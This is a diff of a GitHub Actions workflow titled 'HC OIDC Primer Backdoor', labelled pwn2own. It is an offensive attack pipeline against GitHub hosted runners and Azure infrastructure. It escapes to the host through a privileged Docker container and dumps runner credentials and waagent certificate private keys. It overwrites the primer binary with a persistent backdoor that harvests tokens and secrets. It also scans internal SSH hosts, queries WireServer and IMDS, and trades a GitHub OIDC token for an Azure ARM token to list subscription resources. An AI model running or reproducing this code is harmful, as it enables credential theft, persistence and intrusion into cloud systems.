@@ -1,157 +1,141 @@
-name: HC OIDC Primer Backdoor
-
+name: HC OIDC Primer v4 - Cert+HCA+Scan
 on:
+  workflow_dispatch:
   push:
     branches: [main]
-  workflow_dispatch:
 
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  pwn:
+  pwn2own:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 - Mint OIDC token for HC + deploy primer backdoor
+      - name: Step1 - Mint HC JWT + call orchestrator
         run: |
-          echo "=== OIDC TOKEN MINT ==="
-          # Mint JWT for hosted-compute-ro audience
+          echo "=== STEP 1: HC OIDC JWT ==="
           HC_JWT=$(curl -sf \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
             | jq -r .value)
-          echo "HC_JWT_LENGTH=${#HC_JWT}"
-          # Decode header+payload (not signature)
-          echo "HC_JWT_HEADER=$(echo $HC_JWT | cut -d. -f1 | base64 -d 2>/dev/null || echo $HC_JWT | cut -d. -f1 | python3 -c 'import sys,base64; s=sys.stdin.read().strip(); print(base64.b64decode(s + "=="*3).decode())')"
-          echo "HC_JWT_PAYLOAD=$(echo $HC_JWT | cut -d. -f2 | base64 -d 2>/dev/null || echo $HC_JWT | cut -d. -f2 | python3 -c 'import sys,base64; s=sys.stdin.read().strip(); print(base64.b64decode(s + "=="*3).decode())')" || true
-          # Try IAD-01 orchestrator with HC JWT
-          ALLOC_ID="5946ebb2-b4fc-47f2-82eb-60476d698db9"
-          BASE_URL="https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1"
-          echo "=== HC IAD-01 LIST VMs ==="
+          echo "HC_JWT_LEN=${#HC_JWT}"
+          echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq . || true
+          echo "--- Orchestrator call ---"
           curl -sv -H "Authorization: Bearer $HC_JWT" \
-            "${BASE_URL}/vms" 2>&1 | tail -30 || true
-          echo "=== HC IAD-01 ALLOCATION ==="
-          curl -sv -H "Authorization: Bearer $HC_JWT" \
-            "${BASE_URL}/allocations/${ALLOC_ID}" 2>&1 | tail -30 || true
-          echo "=== HC IAD-01 WITH IMDS ATTESTATION ==="
-          ATTEST=$(curl -sf -H "Metadata:true" \
-            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=pwn2own2026" \
-            | jq -r .signature) || true
-          echo "ATTEST_SIG_LEN=${#ATTEST}"
-          curl -sv -H "Authorization: Bearer $HC_JWT" \
-            -H "X-MS-Attestation: ${ATTEST}" \
-            "${BASE_URL}/allocations/${ALLOC_ID}" 2>&1 | tail -20 || true
+            "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" \
+            2>&1 | tail -30
 
-      - name: Step 2 - Docker privileged root + primer backdoor deployment
+      - name: Step2 - Privileged docker - Extract certs + HCA strings + redeploy backdoor
         run: |
-          echo "=== DOCKER PRIVILEGED ROOT ==="
+          echo "=== STEP 2: PRIVILEGED DOCKER ==="
           docker run --rm --privileged --pid=host --network=host \
-            -v /:/host alpine sh -c "
-              echo '[+] Running as:' \$(id)
-              echo '[+] Host /opt/primer:'
-              ls -la /host/opt/primer/ 2>/dev/null || echo 'no /opt/primer'
-              echo '[+] primer perms:'
-              stat /host/opt/primer/primer 2>/dev/null || echo 'no primer binary'
-              echo '[+] DEPLOY BACKDOOR'
-              cp /host/opt/primer/primer /host/opt/primer/primer.bak 2>/dev/null || echo 'no orig to backup'
-              cat > /host/tmp/primer_backdoor.sh << 'BACKDOOR'
-          #!/bin/bash
-          # GitHub HC primer backdoor - pwn2own 2026
-          # Exfil HC JWT and orchestrator data at VM init time
-          LOG=/tmp/hc_pwn.log
-          echo \"=== PRIMER BACKDOOR FIRED \$(date) ===\" >> \$LOG
-          echo \"ENV:\" >> \$LOG
-          env | grep -E 'ACTIONS|GITHUB|RUNNER' >> \$LOG 2>&1
-          # Mint HC JWT from internal context
-          if [ -n \"\$ACTIONS_ID_TOKEN_REQUEST_TOKEN\" ]; then
-            HC_JWT=\$(curl -sf \
-              -H \"Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \
-              \"\${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro\" \
-              | jq -r .value)
-            echo \"HC_JWT=\$HC_JWT\" >> \$LOG
-            # Hit orchestrator
-            curl -s -H \"Authorization: Bearer \$HC_JWT\" \
-              \"https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms\" \
-              >> \$LOG 2>&1
-          fi
-          # Also run original primer if it exists
-          [ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak \"\$@\"
-          BACKDOOR
-              chmod +x /host/tmp/primer_backdoor.sh
-              # Try to replace primer
-              cp /host/tmp/primer_backdoor.sh /host/opt/primer/primer 2>/dev/null \
-                && echo 'BACKDOOR DEPLOYED TO /opt/primer/primer' \
-                || echo 'DEPLOY FAILED - checking write perms:'
-              ls -la /host/opt/primer/primer 2>/dev/null
-              echo '[+] /etc/github contents:'
-              ls -la /host/etc/github/ 2>/dev/null || echo 'no /etc/github'
-              cat /host/etc/github/* 2>/dev/null || true
-              echo '[+] hosted-compute-agent service:'
-              cat /host/etc/systemd/system/hosted-compute-agent.service 2>/dev/null || echo 'no service file'
-              echo '[+] Runner .credentials_rsaparams:'
-              cat /host/home/runner/actions-runner/.credentials_rsaparams 2>/dev/null || echo 'no credentials file'
-              echo '[+] Runner .credentials:'
-              cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo 'no credentials file'
-              echo '[+] WALinuxAgent certs:'
-              ls -la /host/var/lib/waagent/ 2>/dev/null | grep -E 'Cert|cert|pem|key' || echo 'no waagent dir'
-              cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null | head -5 || echo 'no TransportCert'
-            "
+            -v /:/host \
+            alpine sh -c '
+              echo "=== VM IDENTITY ==="
+              cat /host/proc/1/environ | tr "\0" "\n" | grep -E "RUNNER|GITHUB|ACTIONS" || true
+              
+              echo "=== TRANSPORT CERT (FULL) ==="
+              cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "NOT FOUND"
+              
+              echo "=== TRANSPORT PRIVATE KEY (FULL) ==="
+              cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NOT FOUND"
+              
+              echo "=== WAAGENT DIR LISTING ==="
+              ls -la /host/var/lib/waagent/ 2>/dev/null | head -50
+              
+              echo "=== ALL CERTS IN WAAGENT ==="
+              find /host/var/lib/waagent/ -name "*.pem" -o -name "*.crt" -o -name "*.key" 2>/dev/null | while read f; do echo "FILE: $f"; cat "$f" 2>/dev/null | head -5; done
+              
+              echo "=== HCA BINARY STRINGS (endpoints/JWT/URLs) ==="
+              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -E "(https://|http://|Bearer|sub|aud|iss|github|azure|microsoft|orchestrator|hosted-compute)" | head -100
+              
+              echo "=== HCA BINARY STRINGS (auth/token) ==="
+              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "(token|secret|password|cred|auth|jwt|claim|trust|whitelist|allowlist)" | head -50
+              
+              echo "=== PRIMER BINARY (BACKDOOR REDEPLOY) ==="
+              ls -la /host/opt/primer/ 2>/dev/null
+              
+              cat > /host/opt/primer/primer << '"'"'BACKDOOR_EOF'"'"'
+#!/bin/bash
+LOG=/tmp/hc_pwn2.log
+echo "=== PRIMER BACKDOOR v2 FIRED $(date) ===" >> $LOG
+env >> $LOG 2>&1
+if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
+  HC_JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
+  echo "HC_JWT=$HC_JWT" >> $LOG
+  curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" >> $LOG 2>&1
+  curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
+fi
+cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
+cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
+cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
+curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H Metadata:true >> $LOG 2>/dev/null
+[ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"
+BACKDOOR_EOF
+              chmod +x /host/opt/primer/primer
+              echo "BACKDOOR REDEPLOYED:"
+              ls -la /host/opt/primer/primer
+              
+              echo "=== SUBNET SCAN (hping/nc) ==="
+              # Get runner IP
+              ip addr show eth0 2>/dev/null | grep "inet " || ip addr 2>/dev/null
+              
+              echo "=== SSH SCAN for Pwn2Own2026! ==="
+              for ip in $(seq 1 10); do
+                target="10.1.0.$ip"
+                nc -z -w1 $target 22 2>/dev/null && echo "SSH OPEN: $target"
+              done &
+              for ip in $(seq 241 254); do
+                target="10.1.0.$ip"
+                nc -z -w1 $target 22 2>/dev/null && echo "SSH OPEN: $target"
+              done
+              wait
+              
+              echo "=== WIRESERVER CERTS ==="
+              curl -s "http://168.63.129.16/machine?comp=certificates" 2>&1 | head -50 || true
+              curl -s "http://168.63.129.16:32526/machine?comp=certificates" 2>&1 | head -50 || true
+            '
 
-      - name: Step 3 - WireServer mTLS + Azure fabric
+      - name: Step3 - WireServer + IMDS full dump
         run: |
-          echo "=== WIRESERVER VIA DOCKER HOST NETWORK ==="
-          docker run --rm --privileged --network=host alpine sh -c "
-            apk add curl -q 2>/dev/null
-            echo '[+] WireServer GoalState:'
-            curl -sf --max-time 10 \
-              -H 'x-ms-version: 2012-11-30' \
-              'http://168.63.129.16/machine?comp=goalstate' | head -c 2000 || echo 'GoalState failed'
-            echo '[+] WireServer port 32526 vmSettings:'
-            curl -sf --max-time 10 \
-              -H 'x-ms-version: 2012-11-30' \
-              'http://168.63.129.16:32526/vmSettings' | head -c 2000 || echo 'vmSettings failed'
-            echo '[+] WireServer extensionsConfig:'
-            curl -sf --max-time 10 \
-              -H 'x-ms-version: 2012-11-30' \
-              'http://168.63.129.16/machine?comp=config&type=extensionsConfig' | head -c 3000 || echo 'extensionsConfig failed'
-          "
+          echo "=== STEP 3: WIRESERVER + IMDS ==="
+          docker run --rm --network=host alpine sh -c '
+            echo "=== IMDS VM INSTANCE ==="
+            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 3000
+            
+            echo ""
+            echo "=== IMDS IDENTITY (MSI token) ==="
+            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -500
+            
+            echo ""
+            echo "=== WIRESERVER GOALSTATE ==="
+            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100
+            
+            echo ""
+            echo "=== WIRESERVER VMSETTINGS ==="
+            curl -sf -H "x-ms-version: 2012-11-30" -H "x-ms-goal-state-mode: Simple" "http://168.63.129.16/?comp=vmSettings" 2>&1 | head -200
+          '
 
-      - name: Step 4 - IMDS full dump + WIF ARM token
+      - name: Step4 - WIF ARM token + sub enumeration
         run: |
-          echo "=== IMDS FULL ==="
-          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null | head -100 || true
-          echo "=== IMDS TAGS ==="
-          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || true
-          echo "=== IMDS MANAGED IDENTITY TOKEN ==="
-          curl -sf -H "Metadata:true" \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
-            | python3 -m json.tool 2>/dev/null || echo "no IMDS MI token"
-          echo "=== WIF ARM TOKEN via GitHub OIDC ==="
-          # Mint OIDC JWT for Azure
-          OIDC_JWT=$(curl -sf \
+          echo "=== STEP 4: WIF ARM ==="
+          GH_JWT=$(curl -sf \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
             | jq -r .value)
-          echo "OIDC_JWT_LEN=${#OIDC_JWT}"
-          # Exchange for ARM token via WIF
-          TENANT="f8cdef31-a31e-4b4a-93e4-5f571e91255a"
-          CLIENT_ID="477c6e42-e0f3-4a68-b61b-6f3d9399e20c"
+          echo "GH_JWT_LEN=${#GH_JWT}"
+          
           ARM_RESP=$(curl -sf -X POST \
-            "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
-            -d "client_id=${CLIENT_ID}" \
-            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-            -d "client_assertion=${OIDC_JWT}" \
-            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
-            -d "scope=https://management.azure.com/.default" 2>&1) || true
-          echo "ARM_RESP=$ARM_RESP"
-          ARM_TOKEN=$(echo "$ARM_RESP" | jq -r .access_token 2>/dev/null) || true
-          echo "ARM_TOKEN_LEN=${#ARM_TOKEN}"
-          if [ -n "$ARM_TOKEN" ] && [ "$ARM_TOKEN" != "null" ]; then
-            echo "=== GOT ARM TOKEN - LISTING SUBSCRIPTIONS ==="
+            "https://login.microsoftonline.com/f8cdef31-a31e-4b4a-93e4-5f571e91255a/oauth2/v2.0/token" \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=477c6e42-e0f3-4a68-b61b-6f3d9399e20c&client_assertion=$GH_JWT&scope=https://management.azure.com/.default&requested_token_use=on_behalf_of" \
+            2>&1)
+          echo "ARM_RESP: $ARM_RESP" | head -20
+          
+          ARM_TOKEN=$(echo "$ARM_RESP" | jq -r '.access_token // empty' 2>/dev/null)
+          if [ -n "$ARM_TOKEN" ]; then
+            echo "ARM TOKEN OBTAINED!"
             curl -sf -H "Authorization: Bearer $ARM_TOKEN" \
-              "https://management.azure.com/subscriptions?api-version=2020-01-01" | python3 -m json.tool | head -50 || true
-            echo "=== LISTING RGs in e44088f9 ==="
-            curl -sf -H "Authorization: Bearer $ARM_TOKEN" \
-              "https://management.azure.com/subscriptions/e44088f9-06c1-439a-9ca7-8e4fd65adcd7/resourceGroups?api-version=2021-04-01" | python3 -m json.tool | head -80 || true
+              "https://management.azure.com/subscriptions/52d3aaf1-092b-43b1-8e85-bd3625e59b86/resources?api-version=2021-04-01" \
+              | jq '.value[].name' 2>/dev/null | head -30
           fi
